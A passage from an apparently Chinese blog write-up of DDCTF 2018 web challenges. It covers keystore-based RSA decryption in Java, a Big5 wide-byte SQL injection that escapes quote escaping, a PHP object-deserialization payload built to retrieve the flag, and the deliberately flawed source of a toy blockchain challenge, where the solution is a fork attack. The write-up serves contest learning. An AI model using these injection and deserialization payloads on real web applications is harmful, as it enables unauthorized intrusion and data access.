<span class="keyword">throws</span> Exception &#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">&#123;</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line"></div><div class="line">PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">System.out.println(key);</div><div class="line">Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">cipher.init(<span class="number">2</span>, key); </div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line"></div><div class="line"></div><div class="line">System.out.println(byte2hex(doFinal));</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(Exception e)</div><div class="line">&#123;</div><div class="line">System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p><img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title=""><p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p><img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title=""><p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p><img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title=""><p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p><img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title=""><p>这个反序列执行链很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p><p>mini区块链源码如下（对学习区块链还是挺有意思）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        